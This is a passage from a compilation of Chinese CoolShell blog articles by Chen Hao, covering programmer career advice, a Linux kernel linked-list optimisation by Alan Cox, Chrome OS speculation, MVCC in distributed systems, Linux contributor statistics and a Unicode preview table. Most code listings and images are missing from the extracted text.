这是一个非常不错的演讲，很让人开阔眼界。最后，我想说说英文，很多程序员都很不喜欢英文，哎……怎么说呢？如果你今天对英文还很害怕的话，这只能怪我们的教育制度的失败。但如果你以此为借口的话，那只能怪你自己了。没有英文的能力，你的技术和认知仅限于中文圈中，而中文圈中基本上都是产商的文化。有人说，“功夫网”让我们的internet成为了局域网，而我想说，让我们成为局域网的不是那个墙，而是我们自己的世界观和英文能力。# 对程序员职业的一些建议作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn自从四年前被CSDN采访后（“职业规化就像软件工程”），经常会有网友（尤其是刚毕业的）写邮件来问我一些程序员职业生涯的一些问题，至到今天。比如，国企还是外企的选择，一直编程有没有前途等等问题。面对这样的邮件，我感到有很大的压力，因为如果我的回复很有可能会误人一生，但我另一方面又很想帮助这些人。所以，我基本上还是会尝试回一下这样的邮件。昨天，我又回了一封。但是我心里还是有点忐忑不安。害怕说错了什么。今天，我想把我的一些思路和建议写在这里，一方面供大家参考，另一方面也想听听大家对我的评判，这样不但对更多的人有帮助，同时对我自己也是一个帮助。
下面是某网友前天给我发来的邮件：> 我是一个刚刚毕业的大学生，我觉得自己对于程序员这个行业感到很迷惘，所以发邮件打扰您一下，麻烦了。 > > > 我今年正在找工作，我现在有几家国企的offer，百度的offer还在等待，我觉得第一份工作对我来说很重要，因为第一份基本决定了近几年或者一辈子你在哪个行业发展。家里人都是希望我签国企，但是我自己对技术很感兴趣，一直希望能在技术上面走下去，签国企虽然很轻松但是我总觉得在技术上学不到什么有用的东西，所以我个人倾向是去百度。 > > 我现在很迷惘的是，如果我一直在程序员这个行业上走下去，以后的出路应该是什么呢？还是一直到高级工程师，还是项目管理这种程度吗？ > > > 我现在听很多人在说程序员必需要转行，因为一辈子在编写代码，没有什么好的出路，对于这点，您有什么看法吗？我现在才刚刚从学校毕业，对IT这个行业也不是非常了解，但是我觉得自己自学能力很强，而且确实很想学些东西，你对于一个刚刚毕业的计算机学生有什么建议吗？信件的内容我没有改变，我相信很多人都有相似的问题。我昨天给这们朋友回复了邮件，下面是我回复内容的一个整理。欢迎大家讨论。首先，我想说的是， **这些东西只是我根据我的经历给出的建议，仅仅供大家去参考** ， **你的路你的人生要你自己决定，不要轻易的让人帮你决定，那怕是你的家人** 。
如果我们把所的问题一起谈，那怎么说也说不清楚，所以，请允许我“关键点分离原则”来分开说说。目录* 一、对技术的热情   * 二、对技术的能力   * 三、再说说工作的事   * 四，技术可以做多长   * 五，待遇和职位#### 一、对技术的热情如果我们喜爱编程，喜爱技术的话，那么，我们就会投入热情，自己会去专研很多东西。就像你以前对某个东西痴迷一样，你可以在工作之余还在学习和专研这些东西，你会经常和人讨论这些东西。不知道你是否会和我一样有一种感觉，如果你不学习技术，你不去专研，你就怕被淘汰，你就会感到不舒服。所以，我们一定要问我们自己一下，我们自己喜欢技术吗？喜欢技术到什么程度。只是感兴趣还是喜欢？这两个不一样。 **兴趣能让你开始让你执着，但只有喜爱才会投入热情，只有投入热情才可能会出成绩** 。这个问题你要问问自己。1. 你有多大的热情在这个事业上？   2. 你对你自己的自我价值的实现的诉求有多大？如果你很有热情，可能到了有些痴迷的程度的话，比如，你会因为专研某个问题，学习某个东西，尝试某个东西，达到废寝忘食的程度，而且以些为乐，那么我非常建议你走技术的路线。#### 二、对技术的能力
有兴趣，有热情，并不代表你就一定行。你需要很清楚地认识到，你还需要有能力（我在《再谈“我是怎么招聘程序员”》一文中说了程序员的四个事，操作技能，知识，经验，和能力，大家可以去看看我对“能力”的定义）。你需要反思和重审一下自己是否有能力，你的学习能力怎么样，是经常需要问人，还是可以自己专研？你的思路怎么样，是否能被有经验的人认可，还是能够影响别人？**兴趣和热情只能让你很执着，但并不一定能让你走好这条路，只有你的能力和你的强项才能让你走好这条路** 。希望大家能够清楚地认识到这其中的差别。所以，你一定要对自己做出一个判断，要学会反思，如果你是有能力的适合走技术路线的人，那以我非常建议你走技术路线。我也尝试创过业，但我觉得我这种人是“谋士”，不是能攻城拔寨的“将军”，创业更需要的是“将军”，我目前只能是一个辅佐他们的“谋士”，所以，我也只能尽力能成为一个级别高点的“谋士”。#### 三、再说说工作的事我比较同意的”第一份基本决定了近几年或者一辈子你在哪个行业发展”，但又有一点点不是很同意。因为我毕业的时候，在银行混了两年，然后又去一个国企业呆了2年。所以，第一份工作并没有影响我的职业。但是，我必需承认——当我从银行出来的时候，我落后了，落后了还很多，我花了近5-6年的时候才把这个差距追了回来。
所以，我有几个观点想告诉大家：***** 第一份工作并不决定你的人生 **。因为你可以在2年内换工作。但是你头四年的做的事会对你的职业有影响。这里，我有两个案例分享一下。（我不用说太多了，相信大家自己能体会）**     * 一个是我的同学70后，他以前是程序员，干了5/6年后不想干了，想转行，结果转不了，因为他的工作经历让他很难转行了，他问了一下自己是否愿意和那些刚毕业的80后拿一样的工作一起竞争，最后他自己都不愿意。后来，他去读了MBA，现在还做IT，现在做一些业务咨询方面的工作。不能算失败，但是时间浪费了。     * 还有一个是我的同事，她CS专业毕业想做程序员，但最后为了进一个好的公司只能做QA，现在4年多了，她很想很想做dev，但是却抱怨工作没有给她这样的机会，4年多的QA经验让她很难成为Dev了。我从她做QA一年的时候就在和她说，如果你想做Dev，你就要有技术储备，多和dev在一起工作，QA又怎么样，如果我能读Dev的代码，我总有一天会成为Dev的。事实证明，她对技术并没有太多热情。现在也只能得过且过了。* 如果你觉得自己在技术有自信有热情，而且已经有一些成绩了，我强烈建议你去IT公司中锻炼，越尊重技术的的IT公司越好。就像打球一样，只有和比你厉害的人一起玩，你才会得提高。
* 如果你对技术的热情一般，也没有太多的自我价值的追求，也不想拼搏，而且对吃大锅饭不反感，对没有激情的工作不反感的话，那么，你应该去事业单位，当个公务员，走走常规则的人生，养养老也不错。这里，我多说一句，根据中国的现在国情来看，如果你有自我价值的诉求，你要去大城市，去好的公司，走体制外的路线，如果你又不想来大城市 ，只想呆在地方的话，那么，我个人非常建议你走体制内的路线，在地方，只有体制内的路线是最好的。* 千万别去一些没有前途的小公司（要去小公司你得看看这个公司的人和业务），很多不起眼的小公司现在都变大了，能和一个公司一起成长是相当难得的（我现在就特别想要这方面的经历），现在这个社会，与其去那些很难成长为大公司的小的很不规范的公司，还不如自己创业。（ **更新2011/4/26** ：@islet8  回复中的观点可能比我的更好——“我觉得第一份工作能尽量进大公司的确是有好处的，能够帮你建立起一套规范的、成熟的工作习惯了思维方式，经过一两年（在激情还没被磨灭之前）再挑一个靠谱的、能赌上自己前途的小公司（比如同事朋友等推荐过去的或是他们联合创立的）一起成长一遍，无论公司的成败，对个人来说，那都是成功了”）
#### 四，技术可以做多长在这里，我用我自己经历做个例子，我在软件编程上有14年了（加上大学里的项目就有16年了），虽然我今天是经理了，但是我还是喜欢编程。我以前也听到过别人说的——做技术太辛苦，没前途。我并不这样觉得，因为我觉得技术是实实在在的东西，很实在，这让我很踏实，踏实的感觉得好。因为，* 我个人觉得真正的稳定是，今天我离开 这个公司，我明天就能找到相应的工作。   * 如果我的工作不成问题了，那么我就可以从谋生上升到事业的层次来。   * 只有到了事业这个层次，我才能有所建树。另外，我觉得说出来的那些话的人要么就是“小猫钓鱼”的那些人，要么就是短视的人，你可以问问他们，哪个非技术的行业有前途，然后你去问问从事那个行业的人怎么样看？我15年来都在编程，虽然走了一些弯路，但是我很感谢那些中途退缩者，是他们让我这15年变得更有价值。15年从事同一个件事，这让我很有竞争力。有了竞争力，我的工作才不会是一个问题，我才能上升上事业的层次上来。当然，如果你发现你不适合，你无法坚持，那么我建议你还是想清楚，别的行业你能坚持吗？ **我们不害怕转行，害怕的是自己对自己缺乏认识，害怕的是小猫钓鱼，害怕的是一山望比一山高** 。
#### 五，待遇和职位比如你的职位，薪水，福利，等，我从来都不是很关心这些东西，这些都是次要的（其次重要的），最重要的是你的能力和经历，是那些可以写在你简历上的，让你引以自豪的经历和能力。（一定要自己引以自豪）。 **而你的职位，薪水，只不过是你能力和经历的附属品** 。把自己对待遇和职位的那个目标放在心里，踏踏实实做好今天的事，炼好自己的内功，注重经验的积累和总结，等待一个能让你量变引发质变的机会，用你的能力抓住它不要放手，你会发现你的路就在前方，通往这条路的门不知不觉已经开了。功到自然成，水到渠成。以上是我的一些建议，不一定对，其可能因为我的个人经历有局限，还希望听道大家的讨论和指点。**（请勿用于商业用途，转载时请注明作者和出处）**# Alan Cox：单向链表中prev指针的妙用作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!Alan CoxAlan Cox**（感谢网友** **@我的上铺叫路遥** **投稿）**之前发过一篇二级指针操作单向链表的例子，显示了C语言指针的灵活性，这次再探讨一个指针操作链表的例子，而且是一种完全不同的用法。
这个例子是linux-1.2.13网络协议栈里的，关于链表遍历&数据拷贝的一处实现。源文件是/net/inet/dev.c，你可以从kernel.org官网上下载。从最早的0.96c版本开始，linux网络部分一直采取TCP/IP协议族实现，这是最为广泛应用的网络协议，整个架构就是经典的OSI七层模型的描述，其中dev.c是属于链路层实现。从功能上看，其位于网络设备驱动程序和网络层协议实现模块之间，作为二者之间的数据包传输通道，一种接口模块而存在——对驱动层的接口函数netif_rx, 以及对网络层的接口函数net_bh。前者提供给驱动模块的中断例程调用，用于链路数据帧的封装；后者作为驱动中断例程 **底半部(buttom half)** ，用于对数据帧的解析处理并向上层传送。为了便于理解，这里补充一下网络通信原理和linux驱动中断机制的背景知识。从最底层的物理层说起，当主机和路由器相互之间进行通信的时候，在物理介质上（同轴、光纤等）以电平信号进行传输。主机或路由器的 **硬件接口（网卡）** 负责收发这些信号，当信号发送到接口，再由内置的 **调制解调器(modem)** 将数字信号转换成二进制码，这样才能驻留在主机的硬件缓存中。这时接口（网卡）设备驱动程序将通过 **硬中断** 来获取硬件缓存中的数据，驱动程序是操作系统中负责直接同硬件设备打交道的模块，硬中断的触发是初始化时通过设置控制寄存器实现的，用于通知驱动程序硬件缓存中有新的数据到来。linux卡设备驱动就是在 **中断处理例程(ISR)** 中将硬件缓存数据拷贝到内核缓存中，打包成数据链路帧进行解析处理，再向上分发到各种协议层。由于ISR上下文是原子性的、中断屏蔽的，整个步骤又较为繁琐，因此全部放在ISR中处理会影响到其它中断响应实时性，于是linux有实现一种bottom half的 **软中断** 处理机制，将整个ISR一分为二，前半部上下文屏蔽所有中断，专门处理紧急的、实时性强的事务，如拷贝硬件缓存并打包封装，后半部上下文没有屏蔽中断（但代码不可重入），用于处理比较耗时且非紧急事务，包括数据帧的解析处理和分发。下面要讲的net_bh就属于后半部。
我们主要关心的是将链路帧分发到协议层那一段逻辑，下面摘自net_bh函数中的一段代码：在此稍稍解说一下数据结构，skb就是内核缓存中sock数据封装，协议栈里从链路层到传输层都会用到，只不过封装格式不同，主要是对 **协议首部(header)** 的由下而上层层剥离（反之由上而下是层层创建），在此你只需理解为一个链路数据帧即可。这段代码的逻辑是解析skb中的协议字段，从协议类型链表（由ptype_base维护）中查询对应的协议节点进行函数指针func回调，以便将数据帧分发到相应的协议层（如ARP、IP、8022、8023等）。第一眼看上去是不是有点奇怪？这段代码竟然用一个pt_prev指针去维护ptype链表中前一个节点，从而产生了额外的条件分支判断，咋一看是否多了很多“余”了？回顾一下那篇二级指针操作单向链表的博文，简直完全是反其道而行之的。如果把pt_prev去掉，代码可以精简为：kfree_skb(skb, FREE_WRITE);咋看一下“干净”了很多，不是吗？但我们要记住一点，凡是网上发布的linux内核源代码，都是都是经过众多黑客高手们重重检视并验证过的，人家这么写肯定有十分充足的理由，所以不要太过于相信自己的直觉了，让我们再好好review一下代码吧！看看这段循环里做了什么事情？特别是第592~611行。
由于从网络上拷贝过来skb是唯一的，而分发的协议对象可能是多个，所以在回调之前要做一次clone动作（注意这里是深度拷贝，相当于一次kmalloc）。分发之后还需要调用kfree_skb释放掉原始skb数据块，它的历史使命到此完成了，没有保留的必要（第622行）。 **注意，这两个动作都是存在内核开销的。**然而这里为啥要pt_prev维护一个后向节点呢？这是有深意的，它的作用就是将当前匹配协议项的回调操作延时了。举个例子，如果链表遍历中找到某个匹配项，当前循环仅仅用pt_prev去记录这个匹配项，除此之外不做任何事情，待到下一次匹配项找到时，才去做上一个匹配项pt_prev的回调操作，直到循环结束，才会去做最后的匹配项的回调（当然pt_prev==NULL表示没有一次匹配，直接释放掉），所以这是一种 **拖延战术** 。有什么好处呢？就是比原先节省了很多不必要的操作。那么哪些操作是不必要的呢？这里我们逆向思考一下，我们看到clone是在协议字段匹配并且pt_prev!=NULL的前提条件下执行的，而kfree是在pt_prev==NULL的前提条件下执行的。在此可以假设一下，如果ptype链表中存在N项协议与之匹配，那么这段代码只会执行N-1次clone，而没有pt_prev时将会执行N次clone和1次kfree，再如果ptype链表中有且仅有一项协议与之匹配，那么整个循环既不会执行到第601行的clone，也不会执行到第622行的kfree。
也就是说， **当整个链表至少有一项匹配的一般情况下，pt_prev存在比没有时减少了一次clone和一次kfree的开销；只有全部不匹配的最差情况下，两者都只做一次kfree动作，持平。这就是延迟策略产生的效益** 。熟悉TCP/IP协议族的开发人员应该知道 **MTU（最大传输单元）** 这个概念，遵循不同协议的MTU值是不同的。比如以太网帧MTU是1500个字节，802.3帧MTU是1492字节，PPP链路帧MTU是269字节，而超通道MTU理论上是65535字节。要知道在一个高速吞吐量通信网络环境下，在大块数据分片传输线路里，在内核级别代码中，减少一处系统开销意味着什么？其实我们完全可以抛开一切网络协议相关知识，这不过是一段极其普通的单向链表操作而已，逻辑并不复杂。但是看看人家顶级黑客是怎么思考和coding的，对比一下自己写过的代码，多少次数据处理是用一个简单的for循环匆匆敷衍了事而没有进一步思考其中的粗陋和不合理之处？面对真正的编程高手这种“心计”与“城府”，你是不是有种莫名不安感？你会怀疑你真的了解怎么去使用和操作C语言中基本的链表数据结构么？如果答案是肯定的，那就开始颤抖吧（哈，别误会，其实上面这段话不过是笔者的自我告解罢了）~~~
最后，让我们感谢尊敬的Alan Cox大大对Linux社区卓越精细、无与伦比的贡献！（Alan是图中中部戴红帽子的那位）!Linux Kernel Team**附注：**最新的Linux-2.6.x版本中协议栈实现部分变动很大，但/net/core/dev.c的netif_receive_skb函数里仍然保留了pt_prev这种用法，目的是一样的，都是为了减少一次系统开销的优化操作。关于Alan，他在斯旺西大学工作时，在学校服务器上安装了一个早期的linux版本，供学校使用。他修正了许多的问题，重写了网络系统中的许多部份。随后成为linux内核开发小组中的重要成员。Alan Cox负责维持2.2版，在2.4版上拥有自己的分支（在版本号上会冠上ac，如 2.4.13-ac1）。他的分支版本非常稳定，修正许多错误，许多厂商都使用他的版本。在他去进修工商管理硕士之前，涉入许多linux内核开发的事务，在社群中有很高的地位，有时会被视为是Linus之下的第二号领导者。不过，今年1月28日的时候，Alan因为家庭原因宣布退出Linux项目了，下面是他Google+的声明：> “I’m leaving the Linux world and Intel for a bit for family reasons, I’m > aware that ‘family reasons’ is usually management speak for ‘I think the > boss is an asshole’ but I’d like to assure everyone that while I frequently > think Linus is an asshole (and therefore very good as kernel dictator) I am > departing quite genuinely for family reasons and not because I’ve fallen out > with Linus or Intel or anyone else. Far from it I’ve had great fun working > there.”
（全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 关于 Chrome OS 的一些推论作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn最近Chrome OS被炒作得火热。为什么还有一年后才发布的产品这么早会公布于众？其实不难想象，一个系统级别的产品的推行必须要跟很多OEM厂家谈合作。而你几乎不可能只是秘密地跟一个大公司的2-3个工程总监就能把这种合作谈定，而大多数的OEM公司，例如 DELL， Asus， Acer等这样的公司都不是技术为主导的，商业人士会很早参与意见和项目的计划，一旦知道的人多了，其实也没什么能保密的了。虽然，这样荒腔走板的发布很可能像伤害Android一样伤害Chrome OS。为什么Chrome OS和Android是如此独立的两个东西，看似又是在解决一个方向上的问题呢？其实也不难推测。Android是Google买下来的公司，其带队的Andy Rubin肯定是个对移动设备的能力有远见的大佬，而Chrome浏览器的领袖 Linus Upson是做V8 Engine的，一定对云和未来的Web Apps有着更坚定的远景。当两个这样强势的团队在公司各自划定地盘以后，融合的可能性就相对小了。
另，人们对netbook的遐想自然会把所有可能的技术都考虑一遍，尤其是Android这样先进而开源的东西，自然会有把自己定位为先驱的生产商拿来尽早发布netbook产品占领口碑上的“技术制高点”，但是这是不是一定意味着Android在netbook上有一席之地，由市场决定。* Android是为了更强大的移动设备：有耳朵，有眼睛，知道自己的方位和姿态，方便社交和更好的跟Google产品的融合。   * Chrome是为了更好的云端体验：手上的netbook设备启动几秒就能用，操作系统版本永远最新（安静地后台自动更新更安全）换台机器登陆后，无需配置升级，所有的东西看起来都还一样，所有的东西为Web Apps加速，使人们不在感觉到操作系统的存在。总而言之，以下几个推论：1. Chrome OS上能不能用Android的Apps （store）？很可能，干嘛不？   2. Chrome OS上能不能装浏览器？估计可以，但是有啥必要呢？   3. Android上的浏览器会不会是Chrome?不太值得讨论，他们都基于webkit， 而且共用插件应该不困难，留给社区开发可能更合适   4. Chrome OS会不会和Android合并?短时间不会，就像地线电话和手机一样，但是又有多大差别呢？
两个可能赢的赛马，两个都赌的话……# 多版本并发控制(MVCC)在分布式系统中的应用作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn【感谢 Todd投递本文 – 微博帐号：weidagang 】目录* 问题   * 解决方案1：基于锁的事务   * 解决方案2：多版本并发控制   * 悲观锁和MVCC对比   * 总结   * 参考   * 友情推荐#### 问题最近项目中遇到了一个分布式系统的并发控制问题。该问题可以抽象为：某分布式系统由一个数据中心D和若干业务处理中心L1，L2 … Ln组成；D本质上是一个key-value存储，它对外提供基于HTTP协议的CRUD操作接口。L的业务逻辑可以抽象为下面3个步骤：1. read: 根据keySet {k1, … kn}从D获取keyValueSet {k1:v1, … kn:vn}   2. do: 根据keyValueSet进行业务处理，得到需要更新的数据集keyValueSet’ {k1′:v1′, … km’:vm’} ( **注** ：读取的keySet和更新的keySet’可能不同)   3. update: 把keyValueSet’更新到D （ **注** ：D保证在一次调用更新多个key的原子性）
在没有事务支持的情况下，多个L进行并发处理可能会导致数据一致性问题。比如，考虑L1和L2的如下执行顺序：1. L1从D读取key:123对应的值100   2. L2从D读取key:123对应的100   3. L1将key:123更新为100 + 1   4. L2将key:123更新为100 + 2如果L1和L2串行执行，key:123对应的值将为103，但上面并发执行中L1的执行效果完全被L2所覆盖，实际key:123所对应的值变成了102。#### 解决方案1：基于锁的事务为了让L的处理具有可串行化特性(Serializability)，一种最直接的解决方案就是考虑为D加上基于锁的简单事务。让L在进行业务处理前先锁定D，完成以后释放锁。另外，为了防止持有锁的L由于某种原因长时间未提交事务，D还需要具有超时机制，当L尝试提交一个已超时的事务时会得到一个错误响应。!0915536496-0本方案的优点是实现简单，缺点是锁定了整个数据集，粒度太大；时间上包含了L的整个处理时间，跨度太长。虽然我们可以考虑把锁定粒度降低到数据项级别，按key进行锁定，但这又会带来其他的问题。由于更新的keySet’可能是事先不确定的，所以可能无法在开始事务时锁定所有的key；如果分阶段来锁定需要的key，又可能出现死锁(Deadlock)问题。另外，按key锁定在有锁争用的情况下并不能解决锁定时间太长的问题。所以，按key锁定仍然存在重要的不足之处。
#### 解决方案2：多版本并发控制为了实现可串行化，同时避免锁机制存在的各种问题，我们可以采用基于多版本并发控制（Multiversion concurrency control，MVCC）思想的无锁事务机制。人们一般把基于锁的并发控制机制称成为悲观机制，而把MVCC机制称为乐观机制。这是因为锁机制是一种预防性的，读会阻塞写，写也会阻塞读，当锁定粒度较大，时间较长时并发性能就不会太好；而MVCC是一种后验性的，读不阻塞写，写也不阻塞读，等到提交的时候才检验是否有冲突，由于没有锁，所以读写不会相互阻塞，从而大大提升了并发性能。我们可以借用源代码版本控制来理解MVCC，每个人都可以自由地阅读和修改本地的代码，相互之间不会阻塞，只在提交的时候版本控制器会检查冲突，并提示merge。目前，Oracle、PostgreSQL和MySQL都已支持基于MVCC的并发机制，但具体实现各有不同。MVCC的一种简单实现是基于CAS（Compare-and-swap）思想的有条件更新（Conditional Update）。普通的update参数只包含了一个keyValueSet’，Conditional Update在此基础上加上了一组更新条件conditionSet { … data[keyx]=valuex, … }，即只有在D满足更新条件的情况下才将数据更新为keyValueSet’；否则，返回错误信息。这样，L就形成了如下图所示的Try/Conditional Update/(Try again)的处理模式：
!0915535U3-1虽然对单个L来讲不能保证每次都成功更新，但从整个系统来看，总是有任务能够顺利进行。这种方案利用Conditional Update避免了大粒度和长时间的锁定，当各个业务之间资源争用不大的情况下，并发性能很好。不过，由于Conditional Update需要更多的参数，如果condition中value的长度很长，那么每次网络传送的数据量就会比较大，从而导致性能下降。特别是当需要更新的keyValueSet’很小，而condition很大时，就显得非常不经济。为了避免condition太大所带来的性能问题，可以为每条数据项增加一个int型的版本号字段，由D维护该版本号，每次数据有更新就增加版本号；L在进行Conditional Update时，通过版本号取代具体的值。!0915533324-2另一个问题是上面的解决方案假设了D是可以支持Conditional Update的；那么，如果D是一个不支持Conditional Update的第三方的key- value存储怎么办呢？这时，我们可以在L和D之间增加一个P作为代理，所有的CRUD操作都必须经过P，让P来进行条件检查，而实际的数据操作放在D。这种方式实现了条件检查和数据操作的分离，但同时降低了性能，需要在P中增加cache，提升性能。由于P是D的唯一客户端；所以，P的cache管理是非常简单的，不必像多客户端情形担心缓存的失效。不过，实际上，据我所知redis和Amazon SimpleDB都已经有了Conditional Update的支持。
#### 悲观锁和MVCC对比上面介绍了悲观锁和MVCC的基本原理，但是对于它们分别适用于什么场合，不同的场合下两种机制优劣具体表现在什么地方还不是很清楚。这里我就对一些典型的应用场景进行简单的分析。需要注意的是下面的分析不针对分布式，悲观锁和MVCC两种机制在分布式系统、单数据库系统、甚至到内存变量各个层次都存在。### 场景1：对读的响应速度要求高有一类系统更新特别频繁，并且对读的响应速度要求很高，如股票交易系统。在悲观锁机制下，写会阻塞读，那么当有写操作时，读操作的响应速度就会受到影响；而MVCC不存在读写锁，读操作是不受任何阻塞的，所以读的响应速度会更快更稳定。### 场景2：读远多于写对于许多系统来讲，读操作的比例往往远大于写操作，特别是某些海量并发读的系统。在悲观锁机制下，当有写操作占用锁，就会有大量的读操作被阻塞，影响并发性能；而MVCC可以保持比较高且稳定的读并发能力。### 场景3：写操作冲突频繁如果系统中写操作的比例很高，且冲突频繁，这时就需要仔细评估。假设两个有冲突的业务L1和L2，它们在单独执行是分别耗时t1，t2。在悲观锁机制下，它们的总时间大约等于串行执行的时间：
T = t1 + t2而在MVCC下，假设L1在L2之前更新，L2需要retry一次，它们的总时间大约等于L2执行两次的时间（这里假设L2的两次执行耗时相等，更好的情况是，如果第1次能缓存下部分有效结果，第二次执行L2耗时是可能减小的）：T’ = 2 * t2这时关键是要评估retry的代价，如果retry的代价很低，比如，对某个计数器递增，又或者第二次执行可以比第一次快很多，这时采用MVCC机制就比较适合。反之，如果retry的代价很大，比如，报表统计运算需要算几小时甚至一天那就应该采用锁机制避免retry。从上面的分析，我们可以简单的得出这样的结论：对读的响应速度和并发性要求比较高的场景适合MVCC；而retry代价越大的场景越适合悲观锁机制。#### 总结本文介绍了一种基于多版本并发控制（MVCC）思想的Conditional Update解决分布式系统并发控制问题的方法。和基于悲观锁的方法相比，该方法避免了大粒度和长时间的锁定，能更好地适应对读的响应速度和并发性要求高的场景。#### 参考* Wikipedia – Serializability   * Wikipedia – Compare-and-swap   * Wikipedia – Multiversion concurrency control   * Lock-free algorithms: The try/commit/(try again) pattern   * Amazon SimpleDB FAQs – Does Amazon SimpleDB support transactions?   * redis – Transactions   * A Quick Survey of MultiVersion Concurrency Algorithms   * 非阻塞算法思想在关系数据库应用程序开发中的使用
#### 友情推荐本文的图是用我自己开发的TextDiagram工具画的，欢迎试用！如果您喜欢，请推荐给朋友，谢谢！# 谁写了Linux作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn2009年8月，Linux软件基金会发布了一份叫《Who Writes Linux and Who Supports It》(PDF)的报告。这份报告主要对Linux 2.6.x的开发进行了全方位的统计。看了以后才知道，原来Linux的开发的生产率竟是这样的惊人，而且相当的的令人振奋，所以，在第一时间转过来给大家看看。让人不得不惊叹，这不可思议的具有非凡活力的社区。（注意，我们这里说的是Linux，不是GNU的那些东西，所谓Linux就是Linux的Kernel）下面是一个导读，希望每一个看到这篇文章的朋友都能看看原文的报告：《Who Writes Linux and Who Supports It》(PDF)这份报告的一开始就对Linux的开发进行了总结：* 每2-3个月一个release   * 最近的每一次release都超过10000个补丁   * 有超过1000个开发人员进行开发，他们来自200个公司或组织。   * 自2005年以来，超过5000个来自500个不同公司的开发人员为Linux内核做过贡献。   * 自2008年以来，每次release，都大约增加了10%左右的开发人员，而且，代码码达到了2.7百万行。
是的，这样的生产率真是太疯狂了。下面是这份文档中所涉及的一些介绍和一些具体的统计数据。#### Linux开发模式Linux的开发采用的是一种宽松的，基于时间的开发模式。每一个新的主要版本的release基本上会发生在2-3个月之内。这个开发模式是在2005年形成的，因为任何人都可以修改其内核的代码，所以，很多补丁进入内核的时间非常的快。其中一个有意义的事是，他们有一个叫Linux- Next的服务器，这个服务器一般来说会是下一个版本的staging，比如，如果目前的稳定版本是2.6.31，那么Linux- Next上就会运行2.6.32。这样，所有的developer都能看到下一个版本总体的样子，而且，这更容易发现一些集成性的问题。在2.6的mainline代码库上（mailline是代码库的主线），有一个叫做“stable team”的团队，他们会做短期的维护工作，他们确保所有的重要的补丁或更改都会被放入mailline中，这样就能滚入下一个release。然后，这份文档中给出了大量的开发编译数据。#### 统计数据下面的统计数据是从版本2.6.11开始的，我把源文件中的表格合并成一个大表，如下所示。
!Linux Kernel开发统计数据从上图我们可以看到下面这些东西：* Linux Kernel开发的速度越来越快，看看每个release的补丁数，每天文件增、删、改就可以知道。* Linux Kernel开发的团队是越来越大，包括人员和参与的公司。下面是几个统计图表：!linuxp1   平均每天的修改!linuxp2   代码修改统计!linuxp3   开发人员#### 谁写了Linux最后我们进入主题——谁写了Linux，首先，我们先来看一下进入代码修改的Top 30的开发人员列表：!Top 30 Linux developer我们可以看到，Linus Torvalds （729 总修改，自2.6.24版来254 修改）无法进入前30名。当然，对Linux的贡献绝对不能通过代码行来表示，Linus对Linux就算是在今天也是至关紧要的。好，让我们再来看看那些公司对Linux的贡献。根据这份报告所说，知道每个developer所在的公司，主要是通过了下面的几种方法：* 使用的邮件地址有公司的名字。   * 由赞助者提交的代码。   * 直接询问得到的。所以，这些数据只能算得上的近似，不过也能看到一个总体的样子了。下图中“None”代表没有职业无业游民，“Unknown”代表无名氏或是英雄不知出处。
!Linux Company Top 30我们可以看到，Top 10公司，为Linux贡献了近70%的代码。包括了None和Unknown，而且，那些是拿着公司报酬给Linux作开发的程序员。那么，为什么这些公司要支持Linux的内核开发呢？* 我们可以看到像IBM, Intel, SGI, MIPS, Freescale, HP, Fujitsu这样的大公司，他们的目的当然是为了确保Linux能够在他们的硬件上工作得更好。   * 我们也可以看到像Red Hat, Novell, 和MontaVista这些Linux的Distribution公司，他们是Linux的主力，主要是为了提供给他们的客户更好的服务。   * 同样，我们还能看到像Sony, Nokia, 和Samsung这样的公司，这些公司主要是用Linux来开发数码产品，如摄像机、手机或是电视，他们使用Linux做一些嵌入式开发，以保证他们的产品工作得更好。   * 还有一些和IT都没有关系的，例如：Volkswagen公司在v21.6.25中为Linux加入了PF_CAN网络实现的协议。Quantum Controls BV公司在2.6.30时加入了一个航海导航的补丁，这些公司都会使用Linux来完善他们的产品。
看来，Linux的势头是越来越无法阻挡了，你也想加入这个阵营吗？点下面的链接吧：（全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# Unicode字符预览表作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn关于Unicode的字符表，你可以在这里下载：而有热心人通过上面个表格，使用JavaScript制作了下面这个网页，其穷举并可以显示上述定义的所有的Unicode字符。打开这个网页，左边的那个大表格是一个10×10的列表，每个小单元格上面是这个字符的样子，下面是这个字符的HTML输入格式。这个表格下面是一个预览格，因为有些这符太细腻了。当然，所有的字符不肯定不止100个，所以，网页右上角有三个进度条，一个是100个字符的往后移动，第二个是1000个字符，第三个是10000个。随便找了一下，找到下面这些各式各样的箭头，如下所示：← &#8592; | ↑ &#8593; | → &#8594; | ↓ &#8595; | ↔ &#8596; | ↕ &#8597; | ↖ &#8598; | ↗ &#8599;   ---|---|---|---|---|---|---|---   ↘ &#8600; | ↙ &#8601; | ↚ &#8602; | ↛ &#8603; | ↜ &#8604; | ↝ &#8605; | ↞ &#8606; | ↟ &#8607;   ⇞ &#8670; | ⇟ &#8671; | ⇠ &#8672; | ⇡ &#8673; | ⇢ &#8674; | ⇣ &#8675; | ⇤ &#8676; | ⇥ &#8677;
还有很多更奇怪的字符，你可以上去看看。如果你访问不了了，你可以通过本站下载这个文件：《Unicode 字符集预览表》# 与Martin Fowler关于敏捷方法的问答作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn2009年6月23日，Martin Fowler到公司访问，与我们开了一个小型座谈会并顺便拜访了他在ThoughtWorks的同事们。!MeetMartinFowlerSmall以下是座谈的内容：**1、如何在常规业务中应用敏捷方法？**常规业务（Business As 